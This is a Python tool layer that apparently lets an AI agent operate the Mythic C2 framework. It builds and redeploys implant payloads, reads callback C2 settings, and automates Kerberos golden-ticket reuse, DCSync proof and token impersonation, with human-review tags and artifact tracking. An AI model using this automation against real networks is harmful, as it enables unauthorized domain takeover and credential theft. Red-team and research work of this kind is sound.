        resp = await mythic.execute_custom_query(self.client, query)
        # Payload names response: {'payloadtype': [{'name': 'sage'}, {'name': 'merlin'}]}, type: <class 'dict'>
        return [p['name'] for p in resp['payloadtype']]

    async def get_c2_profile_names(self) -> List[dict[str, str]]:
        """Get a list of all C2 profile names."""
        # HITL: free
        query = """
            query C2ProfileNames {
                c2profile {
                    name
                    description
                }
            }
            """
        if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
        logger.debug("🛠️ Calling get_c2_profile_names tool")
        resp = await mythic.execute_custom_query(self.client, query)
        # C2 profile names response: {'c2profile': [{'name': 'http', 'description': 'HTTP/S C2 Profile'}, {'name': 'websocket', 'description': 'WebSocket C2 Profile'}, {'name': 'dns', 'description': 'DNS C2 Profile'}]}, type: <class 'dict'>
        return [{'name': c['name'], 'description': c['description']} for c in resp['c2profile']] if resp.get('c2profile') else []
    
    async def get_c2_profiles_for_payload(self, payload: Annotated[str, "The name of the payload type to retrieve C2 profiles for such as 'merlin', 'apollo', etc."]):
        """Get C2 profiles for a specific payload type.
        Args:
            payload (str): The name of the payload type to retrieve C2 profiles for such as "merlin", "apollo", etc.
        Returns:
            str: JSON string containing C2 profile information for the specified payload type.
        """
        # HITL: free

        query = """
            query PayloadC2Profiles {
                payloadtypec2profile(where: {payloadtype: {name: {_eq: "PLACEHOLDER"}}}) {
                    payloadtype {
                    name
                    }
                    c2profile {
                    name
                    description
                    is_p2p
                    c2profileparameters {
                        name
                        description
                        parameter_type
                        required
                        default_value
                        choices
                    }
                    }
                }
            }
        """
        query = query.replace("PLACEHOLDER", payload)
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_c2_profiles_for_payload tool for: {payload}")
            results = await mythic.execute_custom_query(self.client, query,)
            return json.dumps(results, sort_keys=True)
        except Exception as e:
            return f"Error executing query: {e}"

    async def get_callback_c2_config(self, display_id: Annotated[int, "The callback display_id to inspect for configured C2 values"]) -> str:
        """Get the actual configured C2 parameter values for a live callback, not just the C2 schema.

        Args:
            display_id: The callback display_id to inspect.
        Returns:
            str: JSON string containing callback host/user and configured C2 values such as callback_host, callback_port, and post_uri.
        """
        # HITL: free
        query = """
            query CB($id: Int!) {
              callback(where: {display_id: {_eq: $id}}) {
                display_id host user
                c2profileparametersinstances {
                  value instance_name
                  c2profileparameter { name }
                  c2profile { name }
                }
              }
            }
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_callback_c2_config tool for callback display_id: {display_id}")
            results = await mythic.execute_custom_query(self.client, query, variables={"id": display_id})
            callbacks = results.get("callback", []) if isinstance(results, dict) else []
            if not callbacks:
                return json.dumps({"callback": None, "c2_parameters": []}, sort_keys=True)
            callback = callbacks[0]
            c2_parameters = []
            for instance in callback.get("c2profileparametersinstances", []):
                c2_parameters.append({
                    "c2profile": (instance.get("c2profile") or {}).get("name"),
                    "parameter_name": (instance.get("c2profileparameter") or {}).get("name"),
                    "value": instance.get("value"),
                })
            return json.dumps({
                "callback": {
                    "display_id": callback.get("display_id"),
                    "host": callback.get("host"),
                    "user": callback.get("user"),
                },
                "c2_parameters": c2_parameters,
            }, sort_keys=True)
        except Exception as e:
            return f"Error executing query: {e}"

    async def get_payload_c2_config(self, payload_uuid: Annotated[str, "The Mythic payload UUID to inspect for configured C2 values and file reference"]) -> str:
        """Get the actual configured C2 parameter values and file reference for an existing built payload.

        Args:
            payload_uuid: The Mythic payload UUID to inspect.
        Returns:
            str: JSON string containing payload metadata, file reference, and configured C2 values.
        """
        # HITL: free
        custom_attributes = """
        uuid
        file_id
        filemetum {
            agent_file_id
            filename_utf8
            id
        }
        c2profileparametersinstances {
            value
            c2profileparameter { name }
            c2profile { name }
        }
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_payload_c2_config tool for payload_uuid: {payload_uuid}")
            payload = await mythic.get_payload_by_uuid(
                self.client,
                payload_uuid=payload_uuid,
                custom_return_attributes=custom_attributes,
            )
            c2_parameters = []
            for instance in payload.get("c2profileparametersinstances", []):
                c2_parameters.append({
                    "c2profile": (instance.get("c2profile") or {}).get("name"),
                    "parameter_name": (instance.get("c2profileparameter") or {}).get("name"),
                    "value": instance.get("value"),
                })
            filemetum = payload.get("filemetum")
            if isinstance(filemetum, list):
                filemetum = filemetum[0] if filemetum else None
            return json.dumps({
                "payload_uuid": payload.get("uuid"),
                "filename": payload.get("filename"),
                "file_id": payload.get("file_id"),
                "agent_file_id": filemetum.get("agent_file_id") if isinstance(filemetum, dict) else None,
                "filemetum": filemetum,
                "c2_parameters": c2_parameters,
            }, sort_keys=True)
        except Exception as e:
            return f"Error getting payload C2 config for {payload_uuid}: {e}"

    async def download_payload(self, payload_uuid: Annotated[str, "The Mythic payload UUID to download/reuse"]) -> str:
        """Download a built payload for reuse and return the Mythic file reference to redeploy it.

        Args:
            payload_uuid: The Mythic payload UUID to download/reuse.
        Returns:
            str: JSON string containing the payload UUID, filename, Mythic agent_file_id, and downloaded byte count.
        """
        # HITL: free
        custom_attributes = """
        uuid
        file_id
        filemetum {
            agent_file_id
            filename_utf8
            id
        }
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling download_payload tool for payload_uuid: {payload_uuid}")
            payload = await mythic.get_payload_by_uuid(
                self.client,
                payload_uuid=payload_uuid,
                custom_return_attributes=custom_attributes,
            )
            payload_bytes = await mythic.download_payload(self.client, payload_uuid=payload_uuid)
            filemetum = payload.get("filemetum")
            if isinstance(filemetum, list):
                filemetum = filemetum[0] if filemetum else None
            return json.dumps({
                "payload_uuid": payload.get("uuid"),
                "filename": payload.get("filename"),
                "file_id": payload.get("file_id"),
                "agent_file_id": filemetum.get("agent_file_id") if isinstance(filemetum, dict) else None,
                "filemetum": filemetum,
                "downloaded_bytes": len(payload_bytes) if payload_bytes is not None else 0,
                "reuse_instruction": "Use agent_file_id with upload_file_by_file_uuid to redeploy this existing payload.",
            }, sort_keys=True)
        except Exception as e:
            return f"Error downloading payload {payload_uuid}: {e}"

    async def delete_payload(
        self,
        payload_uuid: Annotated[str, "The Mythic payload UUID to soft-delete"],
        confirm_delete_successful: Annotated[bool, "Required to delete a successful payload with zero callbacks"] = False,
    ) -> str:
        """Safely soft-delete a junk Mythic payload after verifying it has no callbacks.

        Args:
            payload_uuid: The Mythic payload UUID to soft-delete.
            confirm_delete_successful: Set True only when intentionally deleting a successful payload with zero callbacks.
        Returns:
            str: JSON string describing whether the payload was deleted or refused, and why.
        """
        # HITL: guarded
        preflight_query = """
            query PayloadDeletePreflight($uuid: String!) {
              payload(where: {uuid: {_eq: $uuid}}) {
                id
                uuid
                build_phase
                deleted
                payloadtype { name }
              }
              callback_aggregate(where: {payload: {uuid: {_eq: $uuid}}}) {
                aggregate { count }
              }
            }
        """
        mutation = """
            mutation SoftDeletePayload($uuid: String!) {
              updatePayload(payload_uuid: $uuid, deleted: true) {
                status
                error
              }
            }
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling delete_payload tool for payload_uuid: {payload_uuid}")
            variables = {"uuid": payload_uuid}
            preflight = await mythic.execute_custom_query(self.client, preflight_query, variables=variables)
            payloads = preflight.get("payload", []) if isinstance(preflight, dict) else []
            if len(payloads) != 1:
                return json.dumps({
                    "deleted": False,
                    "payload_uuid": payload_uuid,
                    "reason": "refused: payload not found",
                }, sort_keys=True)

            payload = payloads[0]
            aggregate = ((preflight.get("callback_aggregate") or {}).get("aggregate") or {}) if isinstance(preflight, dict) else {}
            callback_count = int(aggregate.get("count") or 0)
            build_phase = payload.get("build_phase")
            build_phase_normalized = str(build_phase or "").lower()
            base_result = {
                "deleted": False,
                "payload_uuid": payload.get("uuid"),
                "filename": payload.get("filename"),
                "build_phase": build_phase,
                "callback_count": callback_count,
                "already_deleted": payload.get("deleted"),
                "payload_type": (payload.get("payloadtype") or {}).get("name"),
            }

            if payload.get("deleted") is True:
                base_result["reason"] = "no action: payload is already deleted"
                return json.dumps(base_result, sort_keys=True)
            if callback_count >= 1:
                base_result["reason"] = "refused: payload has produced one or more callbacks"
                return json.dumps(base_result, sort_keys=True)
            if build_phase_normalized == "success" and not confirm_delete_successful:
                base_result["reason"] = "refused: successful payloads with zero callbacks require confirm_delete_successful=True"
                base_result["requires_confirmation"] = True
                return json.dumps(base_result, sort_keys=True)
            if build_phase_normalized != "error" and not (build_phase_normalized == "success" and confirm_delete_successful):
                base_result["reason"] = "refused: only build_phase='error' payloads are deleted by default; build_phase='success' requires explicit confirmation"
                return json.dumps(base_result, sort_keys=True)

            mutation_result = await mythic.execute_custom_query(self.client, mutation, variables=variables)
            update_result = mutation_result.get("updatePayload", {}) if isinstance(mutation_result, dict) else {}
            status = update_result.get("status")
            base_result["mutation"] = "updatePayload(deleted=true)"
            base_result["mutation_status"] = status
            if status == "success":
                base_result["deleted"] = True
                base_result["reason"] = "soft-deleted payload after safety checks passed"
            else:
                base_result["reason"] = f"delete mutation failed: {update_result.get('error') or 'unknown error'}"
            return json.dumps(base_result, sort_keys=True)
        except Exception as e:
            return json.dumps({
                "deleted": False,
                "payload_uuid": payload_uuid,
                "reason": f"error while deleting payload: {e}",
            }, sort_keys=True)

    async def get_all_command_names_for_payloadtype(self, payload: Annotated[str, "The name of the payload type (e.g., 'sage', 'apollo', 'poseidon') to get its available commands"]) -> str:
        """Get all available command names for a specific payload type (agent).
        
        This tool retrieves all command names available for a given payload type.

        Args:
            payload: The name of the payload type (e.g., 'sage', 'apollo', 'poseidon')
        Returns:
            str: JSON string containing all commands and their detailed information
        """
        # HITL: free
        query = """
            query SageCommandNames {
                command(where: {payloadtype: {name: {_eq: "PLACEHOLDER"}}}) {
                    cmd
                    description
                }
            }
        """
        query = query.replace("PLACEHOLDER", payload)
        attr = """
        cmd
        description
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_all_command_names_for_payloadtype tool for: {payload}")
            results =  await mythic.execute_custom_query(self.client, query)
            return json.dumps(results, sort_keys=True)
        except Exception as e:
            return f"Error getting commands for payload type {payload}: {e}"

    async def get_all_command_args_for_payloadtype(
            self, 
            payload: Annotated[str, "The name of the payload type (e.g., 'sage', 'apollo', 'poseidon') to get its available commands"],
            command: Annotated[str, "The name of the command to get its arguments (e.g., 'ls', 'pwd', 'whoami')"]) -> str:
        """Get all of a command's arguments for a specific payload type (agent).
        
        This tool retrieves all information about a command's arguments available for a given payload type.

        Args:
            payload: The name of the payload type (e.g., 'sage', 'apollo', 'poseidon')
            command: The name of the command to get its arguments (e.g., 'ls', 'pwd', 'whoami')
        Returns:
            str: JSON string containing all commands and their detailed information
        """
        # HITL: free
        query = """
            query SageCommandArgs {
                command(where: {cmd: {_eq: "COMMAND"}, payloadtype: {name: {_eq: "PAYLOAD"}}}) {
                    cmd
                    commandparameters {
                    cli_name
                    name
                    type
                    description
                    default_value
                    choices
                    parameter_group_name
                    required
                    }
                    help_cmd
                    needs_admin
                }
            }
        """
        query = query.replace("COMMAND", command).replace("PAYLOAD", payload)
 
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_all_command_args_for_payloadtype tool for: {payload}")
            results =  await mythic.execute_custom_query(self.client, query)
            return json.dumps(results, sort_keys=True)
        except Exception as e:
            return f"Error getting command {command} args for payload type {payload}: {e}"
    
    async def get_all_commands_for_payloadtype(self, payload: Annotated[str, "The name of the payload type (e.g., 'sage', 'apollo', 'poseidon') to get its available commands"]) -> str:
        """Get all available commands for a specific payload type (agent).
        
        This tool retrieves information about all commands available for a given payload type,
        including command parameters, descriptions, and requirements.

        Args:
            payload: The name of the payload type (e.g., 'sage', 'apollo', 'poseidon')
        Returns:
            str: JSON string containing all commands and their detailed information
        """
        # HITL: free
        # Command schemas are STATIC per payloadtype — serve repeats from cache as a terse pointer instead
        # of re-dumping the full schema (27× re-fetches bloated context + burned steps in a 2026-06-09 solve).
        cached = self._command_schema_cache.get(payload)
        if cached is not None:
            names = sorted(c.get("cmd") for c in cached if isinstance(c, dict) and c.get("cmd"))
            return json.dumps({
                "payloadtype": payload, "cached": True, "command_count": len(names), "commands": names,
                "note": ("Full schemas for this payloadtype were ALREADY returned earlier this run — re-read "
                         "that output for parameter details. Do NOT re-fetch; choose a command and issue it."),
            }, sort_keys=True)
        attr = """
        cmd
        commandparameters {
        cli_name
        name
        type
        description
        default_value
        choices
        parameter_group_name
        required
        }
        description
        help_cmd
        needs_admin
        """
        try:
            if self.client is None:
                raise Exception("MythicAPIClient not initialized. Call create() first.")
            logger.debug(f"🛠️ Calling get_all_commands_for_payloadtype tool for: {payload}")
            results =  await mythic.get_all_commands_for_payloadtype(self.client, payload, attr)
            try:
                if isinstance(results, list):
                    for _cmd in results:
                        if not isinstance(_cmd, dict):
                            continue
                        _name = _cmd.get("cmd") or ""
                        _schema = _cmd.get("commandparameters") or []
                        # Carry command-level needs_admin into the schema so footprint sees Mythic-native risk.
                        if isinstance(_schema, list) and _cmd.get("needs_admin"):
                            _schema = [*_schema, {"needs_admin": True}]
                        _fp = footprint(_name, {}, _schema if isinstance(_schema, list) else [], None)
                        _ax = _fp["axes"]
                        _cmd["footprint"] = _ax
                        _cmd["footprint_summary"] = _summarize_footprint(_ax)
            except Exception:
                pass
            try:
                if isinstance(results, list):
                    self._command_schema_cache[payload] = results
            except Exception:
                pass
            return json.dumps(results, sort_keys=True)
        except Exception as e:
            return f"Error getting commands for payload type {payload}: {e}"

    async def create_payload(
        self,
        payload_type_name: str,
        filename: str,
        operating_system: str,
        c2_profiles: Annotated[List[Dict[str, str | Dict[str, str]]], "List of C2 profiles where each dict contains 'c2_profile' and 'c2_profile_parameters' keys"],
        build_parameters: Annotated[List[dict[str,str]], "List of build parameters where each dict contains 'name' and 'value' keys"],
        description: str = "",
    ) -> str:
        """Create a new Mythic payload (also known as a Mythic agent) with the specified parameters.
        Returns the created payload information as a JSON string.

        Args:
            payload_type_name: The name of the payload type (e.g., 'sage', 'apollo').
            filename: The name of the output file from the created payload.
            operating_system: The operating system for which the payload is built (e.g., 'linux', 'windows').
            c2_profiles: A list of dictionaries where each dictionary holds the following information:
                {
                    "c2_profile": "http",
                    "c2_profile_parameters": {
                        "parameter name": "parameter value",
                        "parameter name 2": "parameter value 2"
                    }
                }
            build_parameters: a list of dictionaries where each dictionary holds the following payload build parameter information:
                {
                    "name": "build parameter name", "value": "build parameter value"
                }
            description: Optional description for the payload.

        Returns:
            str: JSON string containing the created payload information.
        """
        # HITL: guarded
        # uuid is the Payload UUID not to be confused with the Mythic file UUID
        custom_attributes = """
        build_phase
        uuid
        build_stdout
        build_stderr
        build_message
        id
        filemetum {
            agent_file_id
        }
        """
        if self.client is None:
            raise Exception("MythicAPIClient not initialized. Call create() first.")
        logger.debug(f"🛠️ Calling create_payload tool for: {payload_type_name}, filename: {filename}")
        try:
            matched_os, supported_os = await self._resolve_supported_os(payload_type_name, operating_system)
            if matched_os is not None:
                operating_system = matched_os
            elif supported_os:
                return json.dumps({
                    "status": "error",
                    "tool": "create_payload",
                    "payload_type_name": payload_type_name,
                    "error": f"operating_system '{operating_system}' is not supported by payload type '{payload_type_name}'.",
                    "hint": f"Use one of this payload type's exact supported_os values (case-sensitive): {supported_os}.",
                }, sort_keys=True)
            resp = await mythic.create_payload(
                self.client,
                payload_type_name=payload_type_name,
                filename=filename,
                operating_system=operating_system,
                c2_profiles=c2_profiles,
                build_parameters=build_parameters,
                description=description,
                include_all_commands= True,  # Include all commands in the payload
                custom_return_attributes=custom_attributes,
            )
            # Surface the Agent File ID (the Mythic *file* UUID) at the top level so the model does not
            # confuse it with the Payload UUID. File tools (upload_file_by_file_uuid, download_file) need
            # `agent_file_id` from filemetum — NOT the top-level `uuid`, which identifies the payload.
            if isinstance(resp, dict):
                filemetum = resp.get("filemetum")
                if isinstance(filemetum, list):
                    filemetum = filemetum[0] if filemetum else None
                resp["agent_file_id"] = filemetum.get("agent_file_id") if isinstance(filemetum, dict) else None
                resp["payload_uuid"] = resp.get("uuid")
                resp["_uuid_help"] = (
                    "Pass 'agent_file_id' (the Mythic file UUID) to upload_file_by_file_uuid / download_file. "
                    "'payload_uuid' (a.k.a. 'uuid') identifies the payload, NOT the file — do not pass it to file tools. "
                    "If 'agent_file_id' is null, the build did not produce a file (check build_phase / build_stderr)."
                )
            return json.dumps(resp, sort_keys=True)
        except Exception as e:
            logger.debug(f"create_payload failed for {payload_type_name}/{filename}: {e}")
            return json.dumps({
                "status": "error",
                "tool": "create_payload",
                "payload_type_name": payload_type_name,
                "filename": filename,
                "error": str(e),
                "hint": (
                    "The Mythic payload build/creation failed (no payload UUID was produced). This is "
                    "usually a malformed argument, NOT a transient error — do NOT re-submit identical "
                    "parameters. Verify: (1) c2_profiles has a valid 'c2_profile' name and the required "
                    "'c2_profile_parameters' (e.g. callback_host/callback_port) for this payload type — use "
                    "get_c2_profiles_for_payload to confirm; (2) build_parameters names/values are valid for "
                    "this payload type; (3) payload_type_name and operating_system are correct. Consider "
                    "reusing an existing working payload (get_all_payloads / download_payload) instead of building anew."
                ),
            }, sort_keys=True)

    async def _action_footprint(self, command, params, callback_display_id) -> dict | None:
        try:
            if not (
                (isinstance(params, dict) and params)
                or (isinstance(params, str) and params.strip())
            ):
                return None
            payload_type = await self._resolve_payload_type(callback_display_id)
            schema = []
            if payload_type:
                cached = getattr(self, "_cmd_schema_cache", {}).get((payload_type, command))
                if isinstance(cached, list):
                    schema = cached
            return footprint(command, params, schema, None)
        except Exception:
            return None

    def _ledger_record(self, command, callback_display_id, params, fp) -> None:
        try:
            if fp is None:
                return
            axes = fp["axes"]
            if axes["disk_artifact"] < 1 and axes["new_beacon"] < 1:
                return

            artifact = None
            if axes["disk_artifact"] >= 1:
                known_ext = (
                    ".exe", ".dll", ".ps1", ".bat", ".cmd", ".sh", ".so", ".dylib",
                    ".zip", ".7z", ".rar", ".txt", ".log", ".json", ".csv", ".xml",
                    ".yaml", ".yml", ".config", ".conf", ".bin", ".dat", ".out",
                    ".kirbi", ".ccache", ".dmp", ".dump", ".psm1", ".vbs", ".js",
                    ".hta", ".msi", ".sys", ".scr", ".lnk", ".aspx", ".jsp", ".php",
                    ".py",
                )
                values = params.values() if isinstance(params, dict) else [params]
                for value in values:
                    text = str(value).strip()
                    if re.search(r"[/\\]", text) or text.lower().endswith(known_ext):
                        artifact = text
                        break
            if axes["new_beacon"] >= 1:
                artifact = f"beacon via {command}"
                if isinstance(params, dict) and params.get("host"):
                    artifact += f" on host {params.get('host')}"

            self._artifact_ledger.append({
                "command": command,
                "callback": callback_display_id,
                "artifact": artifact,
                "footprint": axes,
                "total": fp["total"],
                "cleaned": False,
            })
        except Exception:
            return

    def _apply_task_result_class(self, fail_key, result_class: str) -> str:
        attempts = self._task_failure_counts.get(fail_key, 0)
        decision = command_builder.breaker_decision(result_class, attempts)
        if decision == "reset":
            self._task_failure_counts.pop(fail_key, None)
        elif decision == "stop":
            self._task_failure_counts[fail_key] = max(attempts, 2)
        else:
            self._task_failure_counts[fail_key] = attempts + 1
        return decision

    def _serialize_params_for_signature(self, parameters) -> str:
        """Stable serialization of command parameters for the loop-guard action signature."""
        try:
            if isinstance(parameters, (dict, list)):
                return json.dumps(parameters, sort_keys=True)
            return str(parameters)
        except Exception:
            return str(parameters)

    def _normalize_volatile_output(self, text: str) -> str:
        """Strip volatile fields (timestamps, LUIDs/handles) and collapse whitespace so two runs of the same
        command that differ ONLY in drifting values (e.g. `klist` ticket valid/expires/renew times) hash to
        the same string. Without this the loop-guard would never fire on klist. Never raises."""
        try:
            s = str(text or "")
            for pat in getattr(self, "_volatile_output_patterns", []) or []:
                s = pat.sub("", s)
            return " ".join(s.split()).casefold()
        except Exception:
            return str(text or "")

    def _unproductive_action_key(self, command: str, callback_display_id, parameters) -> tuple:
        return (str(command), callback_display_id, self._serialize_params_for_signature(parameters))

    def _unproductive_repeat_nudge(self, command, callback_display_id, parameters, results_str, result_class) -> str | None:
        """Track consecutive identical SUCCESSFUL actions and return an escalating STOP nudge at the limit.

        Only SUCCESS counts: failures are handled by the failure circuit breaker, and SUCCESS is exactly the
        case that breaker RESETS and therefore cannot catch (the `shell klist` loop). A different or non-success
        action breaks the streak AND clears prior loop flags (it is real progress). Never raises."""
        try:
            if str(result_class) != command_builder.ResultClass.SUCCESS.value:
                self._last_action_sig = None
                self._action_repeat_count = 0
                return None
            action_key = self._unproductive_action_key(command, callback_display_id, parameters)
            sig = action_key + (self._normalize_volatile_output(results_str),)
            if sig == self._last_action_sig:
                self._action_repeat_count += 1
            else:
                self._last_action_sig = sig
                self._action_repeat_count = 1
                # A genuinely different successful observation is progress — let previously-looped commands run
                # again (e.g. `klist` after a fresh ticket forge legitimately shows new output).
                self._unproductive_tripped.clear()
            if self._action_repeat_count >= self._unproductive_repeat_limit:
                self._unproductive_tripped.add(action_key)
                self._action_repeat_count = 0
                return (
                    f"STOP — '{command}' on callback {callback_display_id} has returned the SAME output "
                    f"{self._unproductive_repeat_limit}× in a row with no new progress. Re-running a succeeding-"
                    f"but-unchanged command is NOT progress and burns the step budget. If the objective is "
                    f"already satisfied, report the proof chain and call handback_to_supervisor; otherwise take a "
                    f"DIFFERENT next action, or handback_to_supervisor with a concrete named blocker. Do not "
                    f"repeat this command."
                )
            return None
        except Exception:
            return None

    def _cache_kerberos_ticket_artifact(self, command: str, parameters, output: str) -> None:
        try:
            if _normalize_command_name(command) not in {"execute_assembly", "execute-assembly", "inline_assembly"}:
                return
            if isinstance(parameters, dict):
                rendered = " ".join(str(value) for value in parameters.values())
            else:
                rendered = str(parameters or "")
            if "golden" not in rendered.casefold() and "base64(ticket.kirbi)" not in str(output).casefold():
                return
            ticket = self._extract_kerberos_ticket_base64(output)
            if ticket:
                self._capability_artifacts["kerberos_ticket_base64"] = ticket
        except Exception:
            return

    def _log_dcsync_proof_fire(self, target_domain: str, output_len: int) -> None:
        # Runtime proof that the cross-domain DCSync proof was RECOGNIZED as the achieving step (parent krbtgt
        # replicated -> domain_admin). Grep `dcsync-proof RECOGNIZED` in the Sage tmux log to confirm the
        # cross-domain forge recorded da:<parent> instead of "no forged ticket evidence".
        try:
            logger.info(f"🩸 dcsync-proof RECOGNIZED target_domain={target_domain} domain_admin=True out_len={output_len}")
        except Exception:
            pass

    def _log_kerberos_ticket_bind_fire(self, command: str, shape: str, ticket_len: int) -> None:
        # Runtime proof that explicit-TGS ticket substitution actually fired at issue time (a unit test on a
        # dict gives false confidence — the controller path delivers translated/serialized params). Grep
        # `kerberos-ticket-bind FIRED` in the Sage tmux log to confirm the fallback exchange got a real ticket,
        # not a literal `{{kerberos_ticket_base64}}`.
        try:
            logger.info(f"🎟️ kerberos-ticket-bind FIRED command={command} shape={shape} ticket_len={ticket_len}")
        except Exception:
            pass

    def _bind_kerberos_ticket_artifact(self, command: str, parameters):
        try:
            cname = _normalize_command_name(command)
            cached = self._capability_artifacts.get("kerberos_ticket_base64")
            # Managed-ticket consumers: explicit Rubeus `asktgs` fallback runs via execute_assembly, while
            # Merlin current-session `ptt` runs via invoke_assembly. In both cases the captured ticket lives in
            # an assembly-arguments VALUE. By the time this runs, argument resolution may have translated the
            # params to the agent-native key form (e.g. Apollo {Assembly, Arguments} or Merlin {assembly, args})
            # or serialized them to a JSON string — so substitute the placeholder GENERICALLY in any string
            # value of a dict, or in the whole string, never a fixed lowercase key set. A key-specific match
            # silently no-ops on the controller path (unit-green, never fires live): that exact gap shipped the
            # literal `{{kerberos_ticket_base64}}` to Rubeus.
            if cname in {"execute_assembly", "inline_assembly", "invoke_assembly"} and cached:
                placeholder = "{{kerberos_ticket_base64}}"
                if isinstance(parameters, str):
                    if placeholder in parameters:
                        self._log_kerberos_ticket_bind_fire(cname, "str", len(cached))
                        return parameters.replace(placeholder, cached)
                    return parameters
                if isinstance(parameters, dict):
                    out = dict(parameters)
                    changed = False
                    for key, val in out.items():
                        if isinstance(val, str) and placeholder in val:
                            out[key] = val.replace(placeholder, cached)
                            changed = True
                    if changed:
                        self._log_kerberos_ticket_bind_fire(cname, "dict", len(cached))
                        return out
                return parameters
            if cname not in {"ticket_store_add", "ticket_cache_add"} or not isinstance(parameters, dict):
                return parameters
            if not cached:
                return parameters
            out = dict(parameters)
            candidate_key = ""
            for key in ("base64ticket", "base64Ticket", "ticket", "ticket_base64", "credential"):
                if key in out:
                    candidate_key = key
                    break
            if not candidate_key:
                candidate_key = "base64ticket"
            current = str(out.get(candidate_key) or "")
            if not self._is_valid_base64_blob(current):
                out[candidate_key] = cached
                existing = out.get("existingTicket")
                if isinstance(existing, dict):
                    existing = dict(existing)
                    existing["credential"] = cached
                    out["existingTicket"] = existing
            return out
        except Exception:
            return parameters

    def _extract_kerberos_ticket_base64(self, output) -> str:
        if isinstance(output, bytes):
            text = output.decode("utf-8", "replace")
        else:
            text = "" if output is None else str(output)
            stripped = text.strip()
            if len(stripped) >= 3 and stripped[0] == "b" and stripped[1] in {"'", '"'}:
                try:
                    decoded = ast.literal_eval(stripped)
                    if isinstance(decoded, bytes):
                        text = decoded.decode("utf-8", "replace")
                except Exception:
                    pass
        text = (
            text
            .replace("\\r\\n", "\n")
            .replace("\\n", "\n")
            .replace("\\r", "\n")
            .replace("\\t", "\t")
        )
        match = re.search(r"base64\(ticket\.kirbi\)\s*:\s*(?P<body>.+)", text, flags=re.I | re.S)
        if not match:
            return ""
        lines = []
        for line in match.group("body").splitlines():
            stripped = line.strip().strip('"').strip("'")
            if not stripped:
                if lines:
                    break
                continue
            if re.search(r"^\[|^\(|^SAGE OPSEC|^🛠️|^🔧", stripped):
                break
            if re.fullmatch(r"[A-Za-z0-9+/=\\/\s]+", stripped):
                lines.append(stripped)
                continue
            if lines:
                break
        candidate = re.sub(r"\s+", "", "".join(lines)).replace("\\/", "/")
        return candidate if self._is_valid_base64_blob(candidate) else ""

    def _is_valid_base64_blob(self, value: str) -> bool:
        text = re.sub(r"\s+", "", str(value or "")).replace("\\/", "/")
        if len(text) < 64:
            return False
        try:
            base64.b64decode(text, validate=True)
            return True
        except Exception:
            return False

    def _kerberos_logon_context_key(self, command: str, callback_display_id: int, parameters) -> tuple | None:
        try:
            if _normalize_command_name(command) != "make_token" or not isinstance(parameters, dict):
                return None
            credential = parameters.get("Credential") or parameters.get("credential") or {}
            credential_account = credential.get("account") if isinstance(credential, dict) else ""
            credential_realm = credential.get("realm") if isinstance(credential, dict) else ""
            username = self._capability_text(parameters.get("username") or parameters.get("user") or credential_account)
            realm = self._capability_text(parameters.get("domain") or parameters.get("realm") or credential_realm)
            if not username and not realm and isinstance(credential, str):
                bound_context = self._bound_credential_contexts.get(
                    _capability_command_key(command, parameters)
                )
                if bound_context:
                    username, realm = bound_context
            if "\\" in username and not realm:
                realm, _, username = username.partition("\\")
            if "@" in username and not realm:
                username, _, realm = username.partition("@")
            if not username and not realm:
                return None
            netonly = parameters.get("netOnly", parameters.get("netonly", True))
            return (
                int(callback_display_id),
                realm.casefold(),
                username.casefold(),
                bool(netonly),
            )
        except Exception:
            return None

    def _record_kerberos_logon_context(self, command: str, callback_display_id: int, parameters, output: str) -> None:
        try:
            normalized = _normalize_command_name(command)
            if normalized == "rev2self" and "fail" not in str(output).casefold():
                self._authentication_contexts.pop(str(callback_display_id), None)
                self._kerberos_logon_context_keys = {
                    key for key in self._kerberos_logon_context_keys if key[0] != int(callback_display_id)
                }
                self._kerberos_logon_context_callbacks.discard(int(callback_display_id))
                self._kerberos_logon_account_context_keys = {
                    key for key in self._kerberos_logon_account_context_keys
                    if key[0] != str(callback_display_id)
                }
                self._bump_kerberos_context_epoch(callback_display_id)
                return
            key = self._kerberos_logon_context_key(command, callback_display_id, parameters)
            if normalized != "make_token":
                return
            low = str(output or "").casefold()
            if (
                "successfully set primary identity" in low
                or "successfully impersonated" in low
                or "new claims" in low
            ):
                self._authentication_contexts.pop(str(callback_display_id), None)
                callback_key = int(callback_display_id)
                previous_keys = {
                    existing_key
                    for existing_key in self._kerberos_logon_context_keys
                    if existing_key[0] == callback_key
                }
                next_keys = {key} if key else set()
                context_changed = (
                    callback_key not in self._kerberos_logon_context_callbacks
                    or previous_keys != next_keys
                )
                self._kerberos_logon_context_callbacks.add(callback_key)
                self._kerberos_logon_context_keys = {
                    existing_key
                    for existing_key in self._kerberos_logon_context_keys
                    if existing_key[0] != callback_key
                }
                self._kerberos_logon_account_context_keys = {
                    account_key for account_key in self._kerberos_logon_account_context_keys
                    if account_key[0] != str(callback_display_id)
                }
                if key:
                    self._kerberos_logon_context_keys.add(key)
                if context_changed:
                    self._bump_kerberos_context_epoch(callback_display_id)
        except Exception:
            return

    async def probe_authentication_context(
        self,
        callback_display_id: int,
        host: str = "",
        adapter: dict | None = None,
        known_domain_authorities: tuple[str, ...] | set[str] = (),
    ) -> auth_context.AuthenticationContext:
        """Observe the active token identity and any current-session ticket evidence."""
        config = adapter if isinstance(adapter, dict) else {}

        def profile_value(key: str, default):
            return config[key] if key in config else default

        identity_command = str(profile_value("collection_identity_command", "whoami") or "").strip()
        identity_parameters = profile_value("collection_identity_parameters", "")
        if not identity_command:
            raise ValueError("collection identity probe has no command")
        identity_output = await self.issue_task_and_waitfor_task_output(
            identity_command,
            identity_parameters,
            callback_display_id,
        )
        ticket_command = str(profile_value("collection_ticket_command", "ticket_cache_list") or "").strip()
        ticket_parameters = profile_value(
            "collection_ticket_parameters",
            {"luid": "", "getSystemTickets": False},
        )
        ticket_output = ""
